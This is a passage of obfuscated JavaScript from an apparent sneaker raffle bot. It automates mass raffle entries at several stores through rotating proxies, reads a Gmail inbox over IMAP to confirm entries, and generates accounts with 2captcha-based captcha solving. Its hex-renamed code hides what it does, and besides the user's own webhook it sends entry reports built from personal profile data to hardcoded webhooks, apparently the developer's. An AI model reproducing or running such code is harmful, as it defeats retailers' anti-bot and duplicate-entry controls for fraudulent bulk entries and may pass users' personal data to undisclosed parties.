                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x7412e4 = Math['round'](Math['random']() * (_0xbc7a8f['length'] - 0x1));
                        _0x376c2f[_0x39deda]['Size'] == 'RANDOM' && (_0x376c2f[_0x39deda]['Size'] = _0xbc7a8f[_0x7412e4]);
                        var _0xe7a898 = Math['round'](Math['random']() * (_0x1edcb3['length'] - 0x1)), _0x1f812a = _0x1edcb3[_0xe7a898]['split'](':'), _0x34ddae;
                        try {
                            _0x34ddae = await _0x3dd4ff['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1f812a[0x0] + ':' + _0x1f812a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x34ddae = await _0x3dd4ff['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1f812a[0x0] + ':' + _0x1f812a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x508dba() + '\x20[' + _0x24f965['name'] + ']\x20Task\x20' + (_0x39deda + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x59cbb8 = await _0x34ddae['newPage']();
                            await _0x59cbb8['authenticate']({
                                'username': '' + _0x1f812a[0x2],
                                'password': '' + _0x1f812a[0x3]
                            }), await _0x59cbb8['setRequestInterception'](!![]), _0x59cbb8['on']('request', _0x4901e1 => {
                                _0x4901e1['resourceType']() === 'image' || _0x4901e1['resourceType']() === 'font' || _0x4901e1['resourceType']() === 'media' ? _0x4901e1['abort']() : _0x4901e1['continue']();
                            }), await _0x59cbb8['goto'](_0x376c2f[_0x39deda]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x508dba() + '\x20[' + _0x24f965['name'] + ']\x20Task\x20' + (_0x39deda + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x59cbb8['waitForSelector']('#accept-all-gdpr'), await _0x59cbb8['click']('#accept-all-gdpr'), await _0x59cbb8['waitForSelector']('#raffles-product'), await _0x54262e(0x3e8), await _0x59cbb8['$eval']('#raffles-product', _0xc892ea => _0xc892ea['click']()), await _0x54262e(0x1388), await _0x59cbb8['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x1a2056 = await _0x59cbb8['$']('.fancybox-inner\x20>\x20iframe'), _0x57239e = await _0x1a2056['contentFrame']();
                            console['log'](_0x508dba() + '\x20[' + _0x24f965['name'] + ']\x20Task\x20' + (_0x39deda + 0x1) + '\x20:\x20Checking\x20Information'), await _0x57239e['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x54262e(0x1f4), await _0x57239e['type']('input[name=\x22sm-form-email\x22]', _0x376c2f[_0x39deda]['Email']), await _0x54262e(0xc8), await _0x57239e['type']('input[name=\x22sm-form-name\x22]', _0x376c2f[_0x39deda]['FirstName'] + '\x20' + _0x376c2f[_0x39deda]['LastName']), await _0x54262e(0xc8), await _0x57239e['type']('input[name=\x22sm-form-street\x22]', _0x376c2f[_0x39deda]['Address1'] + '\x20' + _0x376c2f[_0x39deda]['HouseNumber'] + '\x20' + _0x376c2f[_0x39deda]['Address2']), await _0x54262e(0xc8), await _0x57239e['type']('input[name=\x22sm-form-city\x22]', _0x376c2f[_0x39deda]['City']), await _0x54262e(0xc8), await _0x57239e['type']('input[name=\x22sm-form-province\x22]', _0x376c2f[_0x39deda]['State']), await _0x54262e(0xc8), await _0x57239e['type']('input[name=\x22sm-form-zip\x22]', _0x376c2f[_0x39deda]['Zip']), await _0x54262e(0xc8), await _0x57239e['type']('input[name=\x22sm-form-country\x22]', _0x376c2f[_0x39deda]['Country']), await _0x54262e(0xc8), await _0x57239e['type']('input[name=\x22sm-form-phone\x22]', _0x376c2f[_0x39deda]['Phone']), await _0x54262e(0xc8), await _0x57239e['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x376c2f[_0x39deda]['Follower']), await _0x54262e(0xc8), await _0x57239e['type']('input[name=\x22sm-cst.size\x22]', _0x376c2f[_0x39deda]['Size']), await _0x54262e(0x1f4), await _0x57239e['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x54262e(0x1f4), await _0x57239e['click']('.icheckbox_simple-custom'), await _0x54262e(0x1f4), console['log'](_0x508dba() + '\x20[' + _0x24f965['name'] + ']\x20Task\x20' + (_0x39deda + 0x1) + '\x20:\x20Sending\x20Request'), await _0x57239e['$eval']('form', _0x187d16 => _0x187d16['submit']()), console['log'](_0x351e10['green'](_0x508dba() + '\x20[' + _0x24f965['name'] + ']\x20Task\x20' + (_0x39deda + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x121746 = '';
                            var _0x137001 = await _0x107feb(_0x376c2f[_0x39deda], _0x24f965, 'dev', ![]), _0x15c7f4 = await _0x107feb(_0x376c2f[_0x39deda], _0x24f965, 'pub', ![]);
                            const _0x4ac514 = {
                                'succesDEVMSG': { 'embeds': [_0x137001] },
                                'succesPUBMSG': { 'embeds': [_0x15c7f4] }
                            };
                            try {
                                _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0x4ac514['succesDEVMSG']), await _0x54262e(0xc8), await _0x459a7f(_0x26f37d, _0x4ac514['succesDEVMSG']), await _0x54262e(0xc8), await _0x459a7f(_0xf106b7, _0x4ac514['succesPUBMSG']);
                            } catch (_0x2e8eca) {
                                console['log'](_0x351e10['yellow'](_0x508dba() + '\x20[' + _0x24f965['name'] + ']\x20Task\x20' + (_0x39deda + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2e8eca));
                            }
                        } catch (_0x3a35ad) {
                            console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x24f965['name'] + ']\x20Task\x20' + (_0x39deda + 0x1) + '\x20:\x20' + _0x3a35ad)), _0x38e762 = '' + _0x3a35ad;
                            var _0x4cd1f6 = await _0x107feb(_0x376c2f[_0x39deda], _0x24f965, 'dev', !![], _0x38e762), _0x137001 = await _0x107feb(_0x376c2f[_0x39deda], _0x24f965, 'dev', ![]), _0x15c7f4 = await _0x107feb(_0x376c2f[_0x39deda], _0x24f965, 'pub', ![]);
                            const _0x53b4ac = {
                                'succesDEVMSG': { 'embeds': [_0x137001] },
                                'succesPUBMSG': { 'embeds': [_0x15c7f4] }
                            };
                            _0x53b4ac['errorDEV'] = { 'embeds': [_0x4cd1f6] }, _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0x53b4ac['errorDEV']), await _0x459a7f(_0x491127, _0x53b4ac['errorDEV']), _0x3a35ad != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x121746 = 'yes');
                        } finally {
                            _0x34ddae['close']();
                            if (_0x121746 == 'yes' && _0x2199d2 != 0x5 && _0x38e762 != 'Size\x20Not\x20Found') {
                                console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x24f965['name'] + ']\x20Task\x20' + (_0x39deda + 0x1) + '\x20:\x20Retrying')), _0x39deda = _0x39deda - 0x1, _0x2199d2 = _0x2199d2 + 0x1;
                                continue;
                            }
                            _0x121746 == 'yes' && _0x2199d2 >= 0x5 && (_0x29ff38(_0x376c2f[_0x39deda], _0x24f965), _0x121746 = 'no', _0x2199d2 = 0x0), console['log'](_0x508dba() + '\x20[' + _0x24f965['name'] + ']\x20Waiting\x20for\x20' + _0x196f8e['delay'] + '\x20ms'), await _0x54262e(_0x196f8e['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x32a85e, _0x16ec1b) {
                    var _0x51d46e = [];
                    async function _0xaa1ee4() {
                        var _0x3a0c86 = new _0x5deaaa({
                            'user': _0x196f8e['masterMail'],
                            'password': _0x196f8e['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0xaa8974(_0x130406) {
                            _0x3a0c86['openBox']('INBOX', ![], _0x130406);
                        }
                        _0x3a0c86['once']('ready', function () {
                            _0xaa8974(function (_0x256f00, _0x1081bf) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x256f00)
                                    throw _0x256f00;
                                _0x3a0c86['seq']['search'](['UNSEEN'], function (_0x311831, _0x331382) {
                                    if (!_0x331382 || !_0x331382['length'])
                                        console['log'](_0x508dba() + '\x20[' + _0x32a85e['name'] + ']\x20No\x20mails\x20found'), _0x3a0c86['end']();
                                    else {
                                        var _0x4acf75 = _0x3a0c86['seq']['fetch'](_0x331382, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x4acf75['on']('message', function (_0x513307, _0x28ab03) {
                                            var _0x14c91b = '(#' + _0x28ab03 + ')\x20';
                                            _0x513307['on']('body', function (_0xab626, _0x521df2) {
                                                _0x45f099(_0xab626, (_0x3ddaf2, _0x1317b3) => {
                                                    if (_0x1317b3['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x2fe09a = _0x1317b3['html']['split']('\x0a');
                                                        for (var _0x2756ba = 0x0; _0x2756ba < _0x2fe09a['length']; _0x2756ba++) {
                                                            if (_0x2fe09a[_0x2756ba]['includes']('salesmanago') && _0x2fe09a[_0x2756ba]['includes']('<td') && _0x2fe09a[_0x2756ba]['includes']('href')) {
                                                                var _0x54ca82 = _0x2fe09a[_0x2756ba]['split']('href=\x22'), _0x5dfdf7 = _0x54ca82[0x1]['split']('\x22')[0x0];
                                                                _0x51d46e['push'](_0x5dfdf7);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x513307['once']('end', function () {
                                            });
                                        }), _0x4acf75['once']('error', function (_0x4119fa) {
                                            console['log']('Fetch\x20error:\x20' + _0x4119fa);
                                        }), _0x4acf75['once']('end', function () {
                                            _0x3a0c86['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x3a0c86['once']('error', function (_0x1afeea) {
                            console['log'](_0x351e10['red'](_0x1afeea['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x3a0c86['once']('end', async function () {
                        }), _0x3a0c86['connect']();
                    }
                    async function _0x2992be(_0x2dcafb, _0x36db70, _0x22c5f0) {
                        for (var _0x56f8ff = 0x0; _0x56f8ff < _0x36db70['length']; _0x56f8ff++) {
                            async function _0x1b1a16(_0x483d21, _0x24b07f, _0x1373e3, _0x57a727, _0x431d25) {
                                var _0x4ec480, _0xee95e6 = {}, _0xa4677e = [], _0x10a11e = {}, _0x1c03b8 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x1b2430 = Math['round'](Math['random']() * (_0x1c03b8['length'] - 0x1));
                                _0x57a727[_0x483d21]['Size'] == 'RANDOM' && (_0x57a727[_0x483d21]['Size'] = _0x1c03b8[_0x1b2430]);
                                !_0x57a727 && (_0x57a727 = {});
                                if (_0x196f8e['useRandomProxy'] = ![])
                                    var _0xa29762 = _0x431d25[_0x483d21]['split'](':');
                                else
                                    var _0x1570a7 = Math['round'](Math['random']() * (_0x431d25['length'] - 0x1)), _0xa29762 = _0x431d25[_0x1570a7]['split'](':');
                                var _0x1ef7ed = {
                                    'jar': _0x3b7fa9,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x1373e3['url'],
                                    'headers': _0x1373e3['headers'],
                                    'body': JSON['stringify'](_0xee95e6),
                                    'proxy': 'http://' + _0xa29762[0x2] + ':' + _0xa29762[0x3] + '@' + _0xa29762[0x0] + ':' + _0xa29762[0x1]
                                };
                                return _0x24b07f != 'ver' && (_0x1ef7ed['url'] = _0x1373e3['url'], _0x1ef7ed['headers'] = _0x1373e3['headers']), _0x24b07f == 'ver' && (_0x1ef7ed['method'] = 'GET', _0x1ef7ed['url'] = _0x57a727[_0x483d21]), new Promise(function (_0x54ce2c, _0x5d181f) {
                                    callback = async (_0x51062b, _0x229bff, _0x2e3904) => {
                                        if (!_0x51062b && _0x229bff['statusCode'] == 0xca || !_0x51062b && _0x229bff['statusCode'] == 0xc8) {
                                            if (_0x24b07f != 'ver') {
                                                var _0x1d21be = await _0x107feb(_0x57a727[_0x483d21], _0x1373e3, 'dev', ![]), _0x3c8223 = await _0x107feb(_0x57a727[_0x483d21], _0x1373e3, 'pub', ![]);
                                                const _0xf863a4 = {
                                                    'succesDEVMSG': { 'embeds': [_0x1d21be] },
                                                    'succesPUBMSG': { 'embeds': [_0x3c8223] }
                                                };
                                                if (_0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '')
                                                    try {
                                                        await _0x459a7f(_0x196f8e['webhook'], _0xf863a4['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x54262e(0xc8), await _0x459a7f(_0x26f37d, _0xf863a4['succesDEVMSG']), await _0x54262e(0xc8);
                                                try {
                                                    await _0x459a7f(_0xf106b7, _0xf863a4['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x3444cf(_0x57a727[_0x483d21], _0x1373e3);
                                            }
                                            _0x54ce2c(console['log'](_0x351e10['green'](_0x508dba() + '\x20[' + _0x1373e3['name'] + ']\x20Task\x20' + (_0x483d21 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x24b07f != 'ver') {
                                                var _0x2102dc = '' + _0x51062b, _0x3842cf = await _0x107feb(_0x57a727[_0x483d21], _0x1373e3, 'dev', !![], _0x2102dc), _0x12878f = {};
                                                _0x12878f['errorDEV'] = { 'embeds': [_0x3842cf] }, _0x29ff38(_0x57a727[_0x483d21], _0x1373e3), _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0x12878f['errorDEV']), await _0x459a7f(_0x491127, _0x12878f['errorDEV']);
                                            }
                                            _0x5d181f(console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x1373e3['name'] + ']\x20Task\x20' + (_0x483d21 + 0x1) + ':\x20' + _0x51062b)));
                                        }
                                    };
                                    try {
                                        _0x24b07f != 'ver' ? console['log'](_0x508dba() + '\x20[' + _0x1373e3['name'] + ']\x20Task\x20' + (_0x483d21 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0xee95e6['data']['attributes']['email']) : console['log'](_0x508dba() + '\x20[' + _0x1373e3['name'] + ']\x20Task\x20' + (_0x483d21 + 0x1) + ':\x20Fetching\x20Response'), _0x2ed36a(_0x1ef7ed, callback);
                                    } catch (_0x4166f0) {
                                        console['log'](_0x508dba() + '\x20Task\x20' + (_0x483d21 + 0x1) + ':\x20' + _0x4166f0);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x1b1a16(_0x56f8ff, 'ver', _0x2dcafb, _0x36db70, _0x22c5f0), console['log'](_0x508dba() + '\x20[' + _0x2dcafb['name'] + ']\x20Sleeping\x20for\x20' + _0x196f8e['delay'] + '\x20ms'), await _0x54262e(_0x196f8e['delay']);
                            } catch (_0x327060) {
                            }
                        }
                    }
                    try {
                        _0xaa1ee4(), await _0x54262e(0xfa0), console['log']('Found\x20' + _0x51d46e['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x2992be(_0x32a85e, _0x51d46e, _0x16ec1b);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x5502c4, _0x233516, _0x5058d3) {
                for (var _0x2ac2ab = 0x0; _0x2ac2ab < _0x233516['length']; _0x2ac2ab++) {
                    _0x196f8e['AfewDelay'] = _0x196f8e['delay'];
                    var _0x2a8af5;
                    if (_0x708249 != 'yes')
                        var _0x708249 = '', _0x794326 = 0x0;
                    var _0x204421 = _0x233516[_0x2ac2ab]['Url'];
                    _0x3feae7(_0x5502c4['name'] + '\x20Task\x20' + (_0x2ac2ab + 0x1) + '\x20/\x20' + _0x233516['length'] + '\x20||\x20File:\x20' + _0x147e1b + '\x20Proxies:\x20' + _0x3f5f24), await _0x2e3034(_0x233516, _0x2ac2ab);
                    var _0x5472af = await _0x107feb(_0x233516[_0x2ac2ab], _0x5502c4, 'dev', ![]), _0x361efd = await _0x107feb(_0x233516[_0x2ac2ab], _0x5502c4, 'pub', ![]);
                    const _0x2a2714 = {
                        'succesDEVMSG': { 'embeds': [_0x5472af] },
                        'succesPUBMSG': { 'embeds': [_0x361efd] }
                    };
                    if (_0x233516[_0x2ac2ab]['Email'] == '' || _0x233516[_0x2ac2ab]['FirstName'] == '' || _0x233516[_0x2ac2ab]['LastName'] == '' || _0x233516[_0x2ac2ab]['Country'] == '' || _0x233516[_0x2ac2ab]['Size'] == '' || _0x233516[_0x2ac2ab]['Address1'] == '' || _0x233516[_0x2ac2ab]['Zip'] == '') {
                        console['log'](_0x508dba() + '\x20[' + _0x5502c4['name'] + ']\x20Task\x20' + (_0x2ac2ab + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x196f8e['useRandomProxy'] = ![])
                        var _0x4781ea = _0x5058d3[_0x2ac2ab]['split'](':');
                    else
                        var _0x493406 = Math['round'](Math['random']() * (_0x5058d3['length'] - 0x1)), _0x4781ea = _0x5058d3[_0x493406]['split'](':');
                    const _0x4dca85 = await _0x3dd4ff['launch']({
                        'headless': !![],
                        'args': [
                            '--proxy-server=' + _0x4781ea[0x0] + ':' + _0x4781ea[0x1],
                            '--no-sandbox',
                            '--disable-setuid-sandbox'
                        ]
                    });
                    try {
                        const _0x1f3a5d = await _0x4dca85['newPage']();
                        await _0x1f3a5d['setDefaultNavigationTimeout'](0x1d4c0), await _0x1f3a5d['authenticate']({
                            'username': '' + _0x4781ea[0x2],
                            'password': '' + _0x4781ea[0x3]
                        }), console['log'](_0x508dba() + '\x20[' + _0x5502c4['name'] + ']\x20Task\x20' + (_0x2ac2ab + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1f3a5d['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x1f3a5d['setRequestInterception'](!![]), _0x1f3a5d['on']('request', _0x4e791d => {
                            _0x4e791d['resourceType']() === 'image' || _0x4e791d['resourceType']() === 'font' || _0x4e791d['resourceType']() === 'media' ? _0x4e791d['abort']() : _0x4e791d['continue']();
                        }), await _0x1f3a5d['goto'](_0x204421, { 'waitUntil': 'networkidle2' }), console['log'](_0x508dba() + '\x20[' + _0x5502c4['name'] + ']\x20Task\x20' + (_0x2ac2ab + 0x1) + '\x20:\x20Gathering\x20cookies'), await _0x1f3a5d['waitForTimeout'](0xfa0), console['log'](_0x508dba() + '\x20[' + _0x5502c4['name'] + ']\x20Task\x20' + (_0x2ac2ab + 0x1) + '\x20:\x20Cookies\x20received'), await _0x1f3a5d['waitForTimeout'](0x320);
                        if (_0x233516[_0x2ac2ab]['Size'] == 'RANDOM') {
                            console['log'](_0x508dba() + '\x20[' + _0x5502c4['name'] + ']\x20Task\x20' + (_0x2ac2ab + 0x1) + '\x20:\x20Choosing\x20random\x20size');
                            const _0x153330 = await _0x1f3a5d['$$eval']('div.size-picker.mt-2\x20>\x20ul\x20>\x20li\x20>\x20a', _0x5a8104 => {
                                return _0x5a8104['map'](_0x599c49 => _0x599c49['href']);
                            });
                            var _0x222ef6 = Math['round'](Math['random']() * (_0x153330['length'] - 0x1));
                            await _0x1f3a5d['goto']('' + _0x153330[_0x222ef6]);
                        } else {
                            console['log'](_0x508dba() + '\x20[' + _0x5502c4['name'] + ']\x20Task\x20' + (_0x2ac2ab + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x233516[_0x2ac2ab]['Size']);
                            try {
                                const _0x138b34 = await _0x1f3a5d['$$eval']('li[data-original-title=\x22Größe\x20in\x20EU:\x20' + _0x233516[_0x2ac2ab]['Size'] + '\x22]\x20>\x20a', _0x35bcdb => {
                                    return _0x35bcdb['map'](_0x26b1e8 => _0x26b1e8['href']);
                                });
                                await _0x1f3a5d['goto']('' + _0x138b34[0x0], { 'waitUntil': 'networkidle2' });
                            } catch (_0xe621f4) {
                                console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x5502c4['name'] + ']\x20Task\x20' + (_0x2ac2ab + 0x1) + '\x20:\x20' + _0xe621f4 + '\x20Size\x20not\x20found')), _0x2a8af5 = 'Size\x20Not\x20Found';
                                var _0x2acd8e = await _0x107feb(_0x233516[_0x2ac2ab], _0x5502c4, 'dev', !![], _0x2a8af5);
                                _0x2a2714['errorDEV'] = { 'embeds': [_0x2acd8e] };
                                _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0x2a2714['errorDEV']);
                                await _0x459a7f(_0x491127, _0x2a2714['errorDEV']);
                                continue;
                            }
                        }
                        await _0x1f3a5d['waitForTimeout'](0x258), await _0x1f3a5d['type']('#raffle-instagram', '' + _0x233516[_0x2ac2ab]['Follower'], { 'delay': 0x64 }), await _0x1f3a5d['waitForTimeout'](0x384), await _0x1f3a5d['click']('#raffle-terms'), await _0x1f3a5d['waitForTimeout'](0x384), await _0x1f3a5d['evaluate'](() => {
                            const _0x125ab6 = document['querySelector']('button.btn[name=\x27add\x27]');
                            _0x125ab6['click']();
                        }), await _0x1f3a5d['waitForTimeout'](0xbb8), await _0x1f3a5d['waitForSelector']('#checkout_email'), await _0x54262e(0x3e8), console['log'](_0x508dba() + '\x20[' + _0x5502c4['name'] + ']\x20Task\x20' + (_0x2ac2ab + 0x1) + '\x20:\x20Filling\x20Information'), await _0x1f3a5d['type']('#checkout_email', '' + _0x233516[_0x2ac2ab]['Email'], 0x32), await _0x54262e(0x320), await _0x1f3a5d['select']('#checkout_shipping_address_country', '' + _0x233516[_0x2ac2ab]['Country']), await _0x1f3a5d['waitForTimeout'](0x258), await _0x1f3a5d['type']('#checkout_shipping_address_first_name', '' + _0x233516[_0x2ac2ab]['FirstName']), await _0x1f3a5d['waitForTimeout'](0x320), await _0x1f3a5d['type']('#checkout_shipping_address_last_name', '' + _0x233516[_0x2ac2ab]['LastName']), await _0x1f3a5d['waitForTimeout'](0x2bc), await _0x1f3a5d['type']('#checkout_shipping_address_address1', _0x233516[_0x2ac2ab]['Address1'] + '\x20' + _0x233516[_0x2ac2ab]['HouseNumber']), await _0x1f3a5d['waitForTimeout'](0x2bc), await _0x1f3a5d['type']('#checkout_shipping_address_address2', '' + _0x233516[_0x2ac2ab]['Address2']), await _0x1f3a5d['waitForTimeout'](0x2bc);
                        _0x233516[_0x2ac2ab]['Postcode'] == undefined ? await _0x1f3a5d['type']('#checkout_shipping_address_zip', '' + _0x233516[_0x2ac2ab]['Zip']) : await _0x1f3a5d['type']('#checkout_shipping_address_zip', '' + _0x233516[_0x2ac2ab]['Postcode']);
                        await _0x1f3a5d['waitForTimeout'](0x2bc), await _0x1f3a5d['type']('#checkout_shipping_address_city', '' + _0x233516[_0x2ac2ab]['City']), await _0x1f3a5d['waitForTimeout'](0x2bc), console['log'](_0x508dba() + '\x20[' + _0x5502c4['name'] + ']\x20Task\x20' + (_0x2ac2ab + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x1f3a5d, _0x1f3a5d['evaluate'](() => {
                            const _0x4af7ef = document['querySelector']('#continue_button');
                            for (var _0x4fe991 = 0x0; _0x4fe991 < 0x5; _0x4fe991++) {
                                if (_0x4af7ef) {
                                    _0x4af7ef['click'](), _0x4af7ef['click']();
                                    break;
                                } else
                                    _0x54262e(0xfa0);
                            }
                        }), await _0x1f3a5d['waitForTimeout'](0x1194);
                        try {
                            await _0x1f3a5d['waitForSelector']('div.radio-wrapper', { 'timeout': 0x186a0 });
                        } catch {
                            console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x5502c4['name'] + ']\x20Task\x20' + (_0x2ac2ab + 0x1) + '\x20:\x20Proxy\x20Error'));
                            continue;
                        }
                        _0x1f3a5d['evaluate'](() => {
                            const _0x54780f = document['querySelector']('#continue_button');
                            for (var _0x3a7e2e = 0x0; _0x3a7e2e < 0x5; _0x3a7e2e++) {
                                if (_0x54780f) {
                                    _0x54780f['click']();
                                    break;
                                } else
                                    _0x54262e(0xfa0);
                            }
                        }), await _0x1f3a5d['waitForTimeout'](0x7d0), console['log'](_0x508dba() + '\x20[' + _0x5502c4['name'] + ']\x20Task\x20' + (_0x2ac2ab + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x1f3a5d['waitForSelector']('#continue_button', { 'timeout': 0x186a0 }), _0x1f3a5d['evaluate'](() => {
                            const _0x302048 = document['querySelector']('#continue_button');
                            for (var _0x32f0f8 = 0x0; _0x32f0f8 < 0x5; _0x32f0f8++) {
                                if (_0x302048) {
                                    _0x302048['click']();
                                    break;
                                } else
                                    _0x54262e(0xfa0);
                            }
                        }), await _0x1f3a5d['waitForTimeout'](0x1194), await _0x1f3a5d['waitForSelector']('#continue_button'), _0x1f3a5d['evaluate'](() => {
                            const _0x12f602 = document['querySelector']('#continue_button');
                            for (var _0x2beb72 = 0x0; _0x2beb72 < 0x5; _0x2beb72++) {
                                if (_0x12f602) {
                                    _0x12f602['click']();
                                    break;
                                } else
                                    _0x54262e(0xfa0);
                            }
                        });
                        try {
                            await _0x1f3a5d['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x708249 = 'no', _0x3444cf(_0x233516[_0x2ac2ab], _0x5502c4), console['log'](_0x351e10['green'](_0x508dba() + '\x20[' + _0x5502c4['name'] + ']\x20Task\x20' + (_0x2ac2ab + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '')
                                try {
                                    await _0x459a7f(_0x196f8e['webhook'], _0x2a2714['succesDEVMSG']);
                                } catch {
                                }
                            await _0x54262e(0xc8), await _0x459a7f(_0x26f37d, _0x2a2714['succesDEVMSG']), await _0x54262e(0xc8);
                            try {
                                await _0x459a7f(_0xf106b7, _0x2a2714['succesPUBMSG']);
                            } catch {
                            }
                        } catch (_0x17aef2) {
                            console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x5502c4['name'] + ']\x20Task\x20' + (_0x2ac2ab + 0x1) + '\x20:\x20Entry\x20Failed:\x20' + _0x17aef2));
                        }
                    } catch (_0x521e4e) {
                        console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x5502c4['name'] + ']\x20Task\x20' + (_0x2ac2ab + 0x1) + '\x20:\x20' + _0x521e4e)), _0x2a8af5 = '' + _0x521e4e;
                        var _0x2acd8e = await _0x107feb(_0x233516[_0x2ac2ab], _0x5502c4, 'dev', !![], _0x2a8af5);
                        _0x2a2714['errorDEV'] = { 'embeds': [_0x2acd8e] }, _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0x2a2714['errorDEV']), await _0x459a7f(_0x491127, _0x2a2714['errorDEV']), _0x708249 = 'yes';
                    } finally {
                        _0x4dca85 && _0x4dca85['close']();
                        if (_0x708249 == 'yes' && _0x794326 != 0x5 && _0x2a8af5 != 'Size\x20Not\x20Found') {
                            console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x5502c4['name'] + ']\x20Task\x20' + (_0x2ac2ab + 0x1) + '\x20:\x20Retrying')), _0x2ac2ab = _0x2ac2ab - 0x1, _0x794326 = _0x794326 + 0x1;
                            continue;
                        }
                        _0x708249 == 'yes' && _0x794326 >= 0x5 && (_0x29ff38(_0x233516[_0x2ac2ab], _0x5502c4), _0x708249 = 'no', _0x794326 = 0x0);
                        if (_0x2ac2ab + 0x1 == _0x233516['length']) {
                            await _0x54262e(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x196f8e['AfewDelay'] + '\x20ms'), await _0x54262e(_0x196f8e['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x2054d1, _0x8b4144, _0x246fbc) {
                    _0x3dd4ff['use'](_0x191e47()), _0x3dd4ff['use'](_0x48a614({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x196f8e['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x410719 = 0x0; _0x410719 < _0x8b4144['length']; _0x410719++) {
                        if (_0x2e8bfc != 'yes')
                            var _0x2e8bfc = '', _0x22e41c = 0x0;
                        var _0x2983c0;
